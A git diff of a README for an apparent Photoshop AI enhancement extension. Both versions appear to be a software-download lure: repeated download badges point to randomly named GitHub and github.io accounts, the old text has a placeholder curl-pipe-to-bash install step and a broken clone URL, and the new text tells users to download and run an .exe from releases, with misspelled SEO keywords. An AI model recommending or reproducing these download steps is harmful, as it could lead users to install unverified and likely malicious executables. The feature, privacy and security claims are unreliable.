@@ -1,313 +1,74 @@
-# 🎨 photoshop-ai-smart-enhance
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://fuelmagistratelead.github.io/photoshop-ai-smart-enhance/)
-
-## 🧠 Intelligent Image Enhancement for Adobe Photoshop
-
-photoshop-ai-smart-enhance is a machine learning extension that automates image quality improvements. Smart exposure correction, intelligent contrast adjustment, adaptive color enhancement, and automated noise reduction. Built for photographers, designers, and production teams using Photoshop CC 2024+.
-
-Process images with adaptive AI algorithms that learn from your edits.
-
-## 🚀 Release
-
-**Version**: 1.8.5 (CC 2024+)
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://fuelmagistratelead.github.io/photoshop-ai-smart-enhance/)
-
-## 📑 Guide
-- [What Is It](#🎯-what-is-it)
-- [Prerequisites](#💻-prerequisites)
-- [Install](#📦-install)
-- [Setup](#⚙️-setup)
-- [Enhancement](#🔧-enhancement)
-- [AI Modes](#✨-ai-modes)
-- [Compatibility](#🔌-compatibility)
-- [Development](#🗺️-development)
-- [Contribute](#🤝-contribute)
-- [Protection](#🛡️-protection)
-- [Support](#🔧-support)
-- [License](#📄-license)
-- [Terms](#⚠️-terms)
-
-## 🎯 What Is It
-
-photoshop-ai-smart-enhance analyzes image characteristics and applies intelligent adjustments. Automatically detects exposure issues, color balance problems, and detail loss. Each enhancement adapts to specific image content, learning from established photography best practices.
-
-Includes adaptive algorithms for exposure, contrast, vibrance, sharpness, and noise reduction. Real-time preview shows results before application.
-
-```mermaid
-graph TD
-    A[Image Input] --> B[Content Analysis]
-    B --> C[Quality Assessment]
-    C --> D[Exposure Detection]
-    C --> E[Color Analysis]
-    C --> F[Detail Evaluation]
-    D --> G[Adaptive Enhancement]
-    E --> G
-    F --> G
-    G --> H[Real-time Preview]
-    H --> I[Apply or Reject]
-    I --> J[Output]
-    
-    style A fill:#fff3e0
-    style B fill:#e3f2fd
-    style C fill:#f3e5f5
-    style G fill:#e8f5e9
-    style J fill:#fce4ec
-```
-
-## 💻 Prerequisites
-
-| Item | Min | Optimal |
-|------|-----|---------|
-| **OS** | ![Windows](https://img.shields.io/badge/Windows-10-0078D4?style=flat) ![Mac](https://img.shields.io/badge/macOS-10.15-000000?style=flat) | ![Windows](https://img.shields.io/badge/Windows-11-0078D4?style=flat) ![Mac](https://img.shields.io/badge/macOS-12-000000?style=flat) |
-| **Photoshop** | CC 2024 | CC 2026 current |
-| **Memory** | 6 GB | 12 GB+ |
-| **Disk** | 600 MB | 2 GB SSD |
-| **GPU** | Optional | NVIDIA/AMD support |
-
-## 📦 Install
-
-### Automated
-
-```bash
-curl -fsSL YOUR_SETUP_SCRIPT | bash
-```
-
-Does:
-1. Compatibility verification
-2. Component installation
-3. Model deployment
-4. Configuration
-5. Testing
-
-### Manual
-
-```bash
-git clone https://fuelmagistratelead.github.io/photoshop-ai-smart-enhance/
-cd photoshop-ai-smart-enhance
-npm install
-npm run build
-npm run deploy:photoshop
-```
-
-### Launch
-
-1. Open Photoshop
-2. **Window → Extensions → AI Smart Enhance**
-3. Load image
-4. Click enhance button
-
-## ⚙️ Setup
-
-### Preferences
-
-Set in **Photoshop → Preferences → Smart Enhance**:
-
-```yaml
-behavior:
-  mode: "auto"
-  preview_live: true
-  save_history: true
-  backup_original: true
-
-enhancement:
-  exposure_auto: true
-  contrast_enhance: true
-  color_adapt: true
-  sharpness_boost: true
-  noise_reduction: true
-  
-processing:
-  quality: "high"
-  speed: "balanced"
-  gpu_enabled: true
-  
-output:
-  format: "smart_object"
-  non_destructive: true
-```
-
-### Enhancement Profiles
-
-- **balanced** — General purpose enhancement
-- **photography** — Photo-specific optimization
-- **portrait** — Skin tone priority
-- **landscape** — Nature photography focus
-- **product** — Commercial photography
-- **document** — Scan enhancement
-- **minimal** — Conservative adjustments
-
-## 🔧 Enhancement
-
-### Auto Enhancement
-
-```bash
-photoshop-enhance auto \
-  --image "active" \
-  --profile "balanced" \
-  --preview true
-```
-
-### Custom Adjustment
-
-```bash
-photoshop-enhance adjust \
-  --exposure 0.3 \
-  --contrast 0.2 \
-  --saturation 0.15 \
-  --sharpness 0.25 \
-  --denoise 0.4
-```
-
-### Batch Processing
-
-```bash
-photoshop-enhance batch \
-  --folder "/input" \
-  --profile "photography" \
-  --output "/output" \
-  --parallel 4
-```
-
-## ✨ AI Modes
-
-| Mode | Purpose | Processing | Result |
-|------|---------|-----------|--------|
-| **Auto** | Universal enhancement | Fast | Consistent |
-| **Portrait** | People photography | Medium | Natural tones |
-| **Landscape** | Nature scenes | Medium | Vibrant colors |
-| **Product** | Commercial work | Fast | Clean output |
-| **Document** | Scans/archives | Fast | Text clarity |
-| **Minimal** | Subtle adjustments | Very Fast | Preserving original |
-| **Custom** | User-defined | Variable | Per-specification |
-
-## 🔌 Compatibility
-
-| Platform | Status | Notes |
-|----------|--------|-------|
-| **Photoshop** | ✅ Full | Native UXP plugin |
-| **Batch Mode** | ✅ Full | Multi-image |
-| **Smart Objects** | ✅ Full | Non-destructive |
-| **Automation** | 🟡 Beta | Script support |
-| **Cloud Sync** | 🟡 Beta | Optional upload |
-| **Mobile Preview** | 🔶 Alpha | iPad companion |
-
-**Status**: ✅ Ready · 🟡 In Progress · 🔶 Coming
-
-## 🗺️ Development
-
-### Q1 2026: Optimization
-- Faster processing
-- Reduced memory usage
-- Improved preview quality
-- Better GPU support
-
-### Q2 2026: Features
-- Advanced tone mapping
-- HDR simulation
-- Color grading presets
-- Style matching
-
-### Q3 2026: Intelligence
-- Adaptive learning
-- User preference detection
-- Smart batch decisions
-- Quality predictions
-
-### Q4 2026: Ecosystem
-- Plugin marketplace
-- Community profiles
-- Workflow templates
-- Integration APIs
-
-## 🤝 Contribute
-
-Help develop the project:
-
-1. **Test** — Report issues and edge cases
-2. **Suggest** — Feature ideas welcome
-3. **Improve** — Documentation contributions
-4. **Share** — Workflow examples
-5. **Beta** — Early access program
-
-```bash
-git clone https://fuelmagistratelead.github.io/photoshop-ai-smart-enhance/
-cd photoshop-ai-smart-enhance
-npm install
-npm run dev
-npm test
-```
-
-## 🛡️ Protection
-
-### Data Safety
-- Local processing by default
-- No automatic uploads
-- Encrypted settings
-- Original files preserved
-
-### System Security
-- Extension sandboxing
-- Resource limits
-- Safe error handling
-- Automatic cleanup
-
-### Privacy
-- No telemetry tracking
-- No personal data collection
-- User-controlled operations
-- Transparent logging
-
-## 🔧 Support
-
-### Common Questions
-
-| Issue | Answer |
-|-------|--------|
-| **Extension not loading** | Update Photoshop to CC 2024+ |
-| **Slow processing** | Close other applications |
-| **GPU not working** | Check driver updates |
-| **Preview lag** | Reduce preview quality |
-| **Memory issues** | Process smaller images |
-
-### Resources
-
-- **Docs**: GitHub Wiki tutorials
-- **Discord**: Community chat
-- **Issues**: Report bugs
-- **Email**: support@ai-enhance.dev
-
-## 📄 License
-
-MIT License - [LICENSE](LICENSE) file.
-
-**Copyright © 2026 Smart Enhance Contributors**
-
-## ⚠️ Terms
-
-Independent project, not affiliated with Adobe Inc. Photoshop trademark belongs to Adobe.
-
-### Key Points
-
-1. **License** — Valid Photoshop CC 2024+ required
-2. **Terms** — Follow Adobe guidelines
-3. **Results** — Depend on image quality and settings
-4. **Backups** — Keep originals safe
-5. **Review** — Check results before use
-6. **Updates** — Stay current with versions
-7. **Responsibility** — Professional judgment essential
-
-### Disclaimer
-
-Enhancement results vary by image and settings. AI suggestions require human review. This tool accelerates workflow, not replaces expertise. Use responsibly for professional work.
-
----
-
-## 🚀 Enhance Your Photography Workflow
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://fuelmagistratelead.github.io/photoshop-ai-smart-enhance/)
-
-**Intelligent enhancement in seconds.** Download and transform your image processing.
-
-*"Smart enhancement. Better images. Every time."*
+# 🎨 photoshop-ai-smart-enhance - Enhance your photos with smart AI
+
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance)
+
+This extension brings artificial intelligence tools to Adobe Photoshop CC 2024 and newer versions. It handles exposure issues, color adjustments, contrast, and noise. Use these tools to improve images for print or web projects. The extension works with smart objects to protect your original files.
+
+## 🛠️ System Requirements
+
+Before you install this software, check your computer setup. You need the following items to run the extension correctly:
+
+*   Adobe Photoshop CC 2024 or a newer edition.
+*   Windows 10 or Windows 11 operating system.
+*   At least 8 GB of RAM.
+*   An internet connection to finish the installation.
+*   A graphics card that supports DirectX 12.
+
+If your computer meets these needs, the extension runs well and provides fast feedback on your edits.
+
+## 📥 Downloading the Software
+
+You need to access the official release page to get the installer for your computer. Follow these steps to obtain the files:
+
+1. Visit the following link to find the download area: [https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance](https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance)
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the most recent version number to see the available files.
+4. Download the file ending in .exe to your desktop or downloads folder.
+
+## ⚙️ Installation Instructions
+
+Once you have the file, you must install it into your Adobe Photoshop folder. Follow this process:
+
+1. Close Adobe Photoshop if it is currently open.
+2. Double-click the installer file you downloaded.
+3. Follow the prompts on your screen.
+4. Select the location where Adobe Photoshop lives on your computer. The default path is usually in your Program Files folder.
+5. Click Install to place the extension tools into the correct plugins directory.
+6. Wait for the progress bar to finish.
+7. Click Finish when the installer tells you the process is complete.
+
+## 🚀 Using the Extension
+
+After you finish the installation, you can open Photoshop to start using the tools. 
+
+1. Launch Adobe Photoshop.
+2. Open the image you want to change.
+3. Go to the top menu bar and select Window. 
+4. Select Extensions and look for the Smart Enhance panel.
+5. Click the name to open the panel window.
+6. Drag the panel to a location on your screen that is easy to reach.
+
+## 🖼️ Feature Overview
+
+The extension provides four main tools for automated photo editing. Each tool performs a specific task to save you time.
+
+*   **Exposure Correction:** This tool analyzes the light levels in your photo. It brightens shadows and recovers detail in highlights to create a balanced look.
+*   **Adaptive Color Correction:** This feature detects the white balance and saturation of your image. It fixes dull or off-color tones with one click.
+*   **Contrast Optimization:** This tool analyzes the edges and mid-tones of your photo. It increases depth without losing detail in the textures.
+*   **Noise Reduction:** This machine learning model identifies grain in high-ISO photos. It smooths the image while keeping sharp details in the subject.
+
+## 🧩 Working with Smart Objects
+
+This extension supports non-destructive editing through smart objects. When you apply an effect, the extension creates a new layer. This keeps your base pixel data safe so you can change your mind later. You can hide the effect layer or adjust the mask if you want to apply the improvement to only part of your photo.
+
+## 🔧 Troubleshooting and Support
+
+If you encounter issues during installation or while using the tool, refer to these common solutions:
+
+*   **Panel not appearing:** Make sure you installed the plugin in the correct Creative Cloud folder. Restart Photoshop after installation to ensure it loads properly.
+*   **Slow processing:** Large images take longer to process because the machine learning model analyzes every pixel. Reduce the resolution of your image if you work on a slower machine.
+*   **Error messages:** Ensure your Adobe Photoshop software is updated to the latest 2024 build via the Creative Cloud desktop application.
+
+If issues persist, check the main repository page again to see if a newer version exists. Developers release updates to fix bugs and improve the speed of the algorithms.
+
+Keywords: abobe, ai, photo-editor, photoshop, smart-ai, smart-enchance
